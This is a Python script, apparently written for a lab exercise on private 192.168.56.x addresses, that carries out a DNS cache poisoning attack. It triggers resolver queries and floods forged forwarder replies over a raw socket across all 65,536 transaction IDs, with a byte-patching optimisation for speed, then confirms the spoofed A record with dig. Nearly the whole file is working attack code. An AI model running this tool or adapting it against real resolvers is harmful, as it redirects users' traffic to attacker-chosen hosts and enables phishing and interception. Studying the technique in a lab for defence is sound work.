#!/usr/bin/env python3
"""DNS cache poisoning spoofer.

Two threads:
  - trigger: forces the resolver to emit an outbound query to the
    black-hole forwarder (~6 s cadence, aligned with Unbound's
    negative-cache TTL).
  - flood: sweeps all 65,536 transaction IDs with forged replies whose
    source IP impersonates the forwarder.

Verification: between sweeps, the main thread re-queries the resolver via
`dig` and checks for the spoofed A record. Exits 0 on success.

See docs/superpowers/specs/2026-05-05-dns-cache-poisoning-part1-design.md
"""
import argparse
import socket
import subprocess
import sys
import threading
import time

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, raw


def build_spoofed_response(src_ip, dst_ip, dst_port, txid,
                           qname, spoof_ip, ttl=86400):
    """Forged reply impersonating the forwarder."""
    return (
        IP(src=src_ip, dst=dst_ip)
        / UDP(sport=53, dport=dst_port)
        / DNS(
            id=txid,
            qr=1, aa=1, ra=1, rd=1,
            qd=DNSQR(qname=qname, qtype="A"),
            an=DNSRR(rrname=qname, type="A",
                     rdata=spoof_ip, ttl=ttl),
        )
    )


def build_trigger_query(resolver_ip, qname, src_port=0):
    """A normal recursive query that forces resolver to emit an outbound."""
    return (
        IP(dst=resolver_ip)
        / UDP(sport=src_port or 0, dport=53)
        / DNS(rd=1, qd=DNSQR(qname=qname, qtype="A"))
    )


def flood(stop_event, src_ip, dst_ip, dst_port, qname, spoof_ip):
    """Spray spoofed replies sweeping all 65,536 transaction IDs.

    Build the packet bytes ONCE with UDP checksum disabled (legal per
    RFC 768), find the offset where the DNS transaction ID lives, and
    in the hot loop just patch those 2 bytes per txid. Scapy's
    per-packet `raw()` is too slow (~1 ms each → 65 s per sweep), and
    UDP checksum recomputation would be the bottleneck even with raw
    sockets. With chksum=0 we sweep all 65,536 in ~0.3 s.
    """
    template_pkt = (
        IP(src=src_ip, dst=dst_ip)
        / UDP(sport=53, dport=dst_port, chksum=0)
        / DNS(
            id=0, qr=1, aa=1, ra=1, rd=1,
            qd=DNSQR(qname=qname, qtype="A"),
            an=DNSRR(rrname=qname, type="A",
                     rdata=spoof_ip, ttl=86400),
        )
    )
    template = bytearray(raw(template_pkt))
    # IP header is 20 bytes (no options), UDP is 8 bytes, DNS id is the
    # first 2 bytes of DNS payload.
    txid_offset = 20 + 8

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    sent = 0
    try:
        while not stop_event.is_set():
            for txid in range(65536):
                if stop_event.is_set():
                    return sent
                template[txid_offset]     = (txid >> 8) & 0xff
                template[txid_offset + 1] = txid & 0xff
                sock.sendto(bytes(template), (dst_ip, 0))
                sent += 1
    finally:
        sock.close()
    return sent


def trigger(stop_event, resolver_ip, qname, period=6.0):
    """Force the resolver to emit an outbound query on each cycle.

    Cadence matches Unbound's default negative-cache TTL (~5 s) so each
    trigger reliably produces a fresh outbound query rather than being
    deduplicated against a pending in-flight query.
    """
    fired = 0
    while not stop_event.is_set():
        send(build_trigger_query(resolver_ip, qname), verbose=False)
        fired += 1
        # Wake every 0.5 s so we can stop promptly when poisoned
        for _ in range(int(period / 0.5)):
            if stop_event.is_set():
                return fired
            time.sleep(0.5)
    return fired


def verify_poisoned(resolver_ip, qname, expected_ip, timeout=2):
    """Re-query the resolver via dig and check the answer."""
    try:
        out = subprocess.run(
            ["dig", f"@{resolver_ip}", qname, "+short",
             f"+time={timeout}", "+tries=1"],
            capture_output=True, text=True, timeout=timeout + 2,
        )
        return expected_ip in out.stdout
    except subprocess.TimeoutExpired:
        return False


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--resolver",  default="192.168.56.20")
    ap.add_argument("--target",    default="www.target.lab")
    ap.add_argument("--spoof-ip",  default="192.168.56.10")
    ap.add_argument("--src-ip",    default="192.168.56.99",
                    help="impersonated forwarder IP")
    ap.add_argument("--src-port",  type=int, default=33333,
                    help="resolver's pinned source port")
    ap.add_argument("--max-seconds", type=int, default=60)
    args = ap.parse_args()

    stop = threading.Event()
    t_flood = threading.Thread(
        target=flood,
        args=(stop, args.src_ip, args.resolver, args.src_port,
              args.target, args.spoof_ip),
        daemon=True,
    )
    t_trigger = threading.Thread(
        target=trigger,
        args=(stop, args.resolver, args.target),
        daemon=True,
    )

    print(f"[*] target={args.target} via resolver={args.resolver}")
    print(f"[*] spoofing src={args.src_ip} dport={args.src_port} → "
          f"A {args.spoof_ip}")
    t_flood.start()
    t_trigger.start()

    start = time.time()
    poisoned = False
    while time.time() - start < args.max_seconds:
        if verify_poisoned(args.resolver, args.target, args.spoof_ip):
            poisoned = True
            break
        time.sleep(2)

    stop.set()
    elapsed = time.time() - start

    if poisoned:
        print(f"[+] poisoned in {elapsed:.1f} seconds "
              f"(target={args.target} → {args.spoof_ip})")
        sys.exit(0)
    print(f"[-] FAILED to poison within {args.max_seconds}s")
    sys.exit(1)


if __name__ == "__main__":
    main()
